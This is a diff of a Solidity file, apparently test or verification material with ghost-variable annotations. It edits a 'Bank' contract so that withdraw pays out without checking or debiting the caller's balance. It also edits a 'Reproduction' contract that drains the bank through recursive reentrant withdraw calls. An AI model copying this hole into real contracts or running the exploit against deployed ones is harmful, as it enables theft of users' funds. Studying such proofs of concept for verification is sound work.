@@ -6,7 +6,7 @@ interface IBank {
     function withdraw(uint amount) external;
 }
 
-contract Bank is IBank{
+contract Bank is IBank {
     mapping(address => uint) balances;
 
     function deposit() public payable {
@@ -14,13 +14,10 @@ contract Bank is IBank{
     }
 
     function withdraw(uint amount) public {
+        require(amount > 0);
         /// @custom:preghost function withdraw
         uint old_contract_balance = address(this).balance;
-        require(amount > 0);
-        require(amount <= balances[msg.sender]);
-
         (bool success, ) = msg.sender.call{value: amount}("");
-        balances[msg.sender] -= amount;
         require(success);
         /// @custom:postghost function withdraw
         uint new_contract_balance = address(this).balance;
@@ -28,32 +25,22 @@ contract Bank is IBank{
     }
 }
 
-
 contract Reproduction {
-    IBank public target;
-    address public owner;
+    Bank public target;
 
     constructor(address _target) {
-        target = IBank(_target);
-        owner = msg.sender;
+        target = Bank(_target);
     }
-
     function setup() external payable {
-        require(msg.sender == owner);
         require(msg.value > 0);
         target.deposit{value: msg.value}();
     }
 
     function trigger(uint amount) external {
-        require(msg.sender == owner);
         target.withdraw(amount);
     }
 
     receive() external payable {
-        if (address(target).balance > 0) {
-            target.withdraw(msg.value);
-        }
+        target.withdraw(msg.value);
     }
 }
-
-
